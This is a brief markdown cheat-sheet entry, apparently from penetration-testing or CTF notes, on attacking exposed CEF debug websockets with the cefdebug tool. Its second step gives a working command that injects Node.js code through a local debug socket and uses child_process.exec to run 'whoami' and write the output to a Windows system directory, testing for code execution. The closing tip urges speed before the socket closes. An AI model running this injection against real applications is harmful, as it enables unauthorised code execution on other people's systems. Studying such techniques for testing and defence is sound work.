### For more information see this repo: https://github.com/taviso/cefdebug

### Steps:

#### 1) Run the binary without arguments to check for CEF debug sockets to connect

#### 2) .\cefdebug --code "process.mainModule.require('child_process').exec('whoami > C:\windows\system32\spool\drivers\color\0xdf')" --url ws://127.0.0.1:64493/fd4b0ffa-a388-40da-b01a-62709102094b (Test for RCE)

### TIP: Act quickly because these sockets don't last long enough
